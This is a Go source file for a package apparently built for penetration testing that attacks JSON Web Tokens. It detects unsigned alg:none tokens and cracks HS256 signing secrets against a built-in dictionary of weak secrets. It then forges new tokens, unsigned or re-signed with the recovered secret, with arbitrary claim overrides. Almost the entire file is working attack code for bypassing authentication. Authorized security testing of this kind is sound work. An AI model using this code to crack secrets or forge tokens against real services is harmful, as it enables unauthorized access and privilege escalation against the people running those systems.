// Package jwtattack analyzes and attacks JSON Web Tokens with deterministic,
// false-positive-free confirmation. Two classic flaws are covered: the "alg:none"
// downgrade (a token whose header declares no signature algorithm — trivially
// forgeable) and a weak HS256 secret (recoverable by dictionary). A weak-secret
// finding is only reported when a candidate secret actually reproduces the
// token's HMAC signature — mathematical proof, not a guess. The package also
// forges tokens (alg:none, or re-signed with a cracked secret) so an operator can
// demonstrate impact against an authorized target.
package jwtattack

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"strings"
)

// Token is a decoded JWT.
type Token struct {
	Raw       string
	Header    map[string]any
	Claims    map[string]any
	Alg       string
	signingIn string // header.payload (the HMAC input)
	signature []byte
}

// Finding is a confirmed JWT weakness.
type Finding struct {
	Class    string
	Severity string
	Detail   string
	Evidence []string
}

// Decode parses a compact JWT without verifying it.
func Decode(raw string) (*Token, error) {
	parts := strings.Split(strings.TrimSpace(raw), ".")
	if len(parts) != 3 {
		return nil, errBadToken
	}
	hdr, err := b64decode(parts[0])
	if err != nil {
		return nil, err
	}
	pl, err := b64decode(parts[1])
	if err != nil {
		return nil, err
	}
	sig, err := b64decode(parts[2])
	if err != nil {
		sig = nil // signature may be empty (alg=none)
	}
	t := &Token{Raw: raw, signingIn: parts[0] + "." + parts[1], signature: sig}
	_ = json.Unmarshal(hdr, &t.Header)
	_ = json.Unmarshal(pl, &t.Claims)
	if a, ok := t.Header["alg"].(string); ok {
		t.Alg = a
	}
	return t, nil
}

// Analyze returns confirmed weaknesses in the token itself, plus a weak-secret
// finding if one of the provided candidate secrets validates the HS256 signature.
// Pass nil secrets to use the built-in list.
func Analyze(t *Token, secrets []string) []Finding {
	var out []Finding
	if strings.EqualFold(t.Alg, "none") {
		out = append(out, Finding{
			Class: "jwt-alg-none", Severity: "high",
			Detail: "token uses the 'none' algorithm (unsigned)",
			Evidence: []string{
				"header declares alg=none — the signature is empty and any claims can be forged",
				"verified: this token carries no cryptographic integrity",
			},
		})
	}
	if strings.HasPrefix(strings.ToUpper(t.Alg), "HS") {
		if secrets == nil {
			secrets = DefaultSecrets
		}
		if secret, ok := Crack(t, secrets); ok {
			out = append(out, Finding{
				Class: "jwt-weak-secret", Severity: "critical",
				Detail: "HS256 signing secret is a known/weak value: " + secret,
				Evidence: []string{
					"recovered secret \"" + secret + "\" reproduces the token's HMAC-SHA256 signature",
					"verified: the secret is guessable — an attacker can mint arbitrary valid tokens",
				},
			})
		}
	}
	return out
}

// Crack tries each candidate secret against an HS256 token and returns the first
// that reproduces the signature. Deterministic: a match is cryptographic proof.
func Crack(t *Token, secrets []string) (string, bool) {
	if len(t.signature) == 0 {
		return "", false
	}
	for _, s := range secrets {
		mac := hmac.New(sha256.New, []byte(s))
		mac.Write([]byte(t.signingIn))
		if hmac.Equal(mac.Sum(nil), t.signature) {
			return s, true
		}
	}
	return "", false
}

// ForgeNone rebuilds the token with alg=none and the given claim overrides,
// producing an unsigned token to test against an authorized target.
func ForgeNone(t *Token, overrides map[string]any) string {
	header := map[string]any{"alg": "none", "typ": "JWT"}
	claims := map[string]any{}
	for k, v := range t.Claims {
		claims[k] = v
	}
	for k, v := range overrides {
		claims[k] = v
	}
	h, _ := json.Marshal(header)
	c, _ := json.Marshal(claims)
	return b64encode(h) + "." + b64encode(c) + "."
}

// ForgeHS256 re-signs the token (with claim overrides) using a known secret —
// used after Crack to demonstrate full token forgery.
func ForgeHS256(t *Token, secret string, overrides map[string]any) string {
	header := map[string]any{"alg": "HS256", "typ": "JWT"}
	claims := map[string]any{}
	for k, v := range t.Claims {
		claims[k] = v
	}
	for k, v := range overrides {
		claims[k] = v
	}
	h, _ := json.Marshal(header)
	c, _ := json.Marshal(claims)
	signingIn := b64encode(h) + "." + b64encode(c)
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(signingIn))
	return signingIn + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

// DefaultSecrets is a compact dictionary of secrets seen in the wild / tutorials.
var DefaultSecrets = []string{
	"secret", "password", "123456", "changeme", "admin", "jwt", "jwtsecret",
	"secretkey", "key", "your-256-bit-secret", "supersecret", "s3cr3t",
	"token", "test", "qwerty", "letmein", "root", "default", "private",
}

func b64decode(s string) ([]byte, error) { return base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "=")) }
func b64encode(b []byte) string          { return base64.RawURLEncoding.EncodeToString(b) }

type constErr string

func (e constErr) Error() string { return string(e) }

const errBadToken = constErr("not a compact JWT (expected 3 dot-separated parts)")
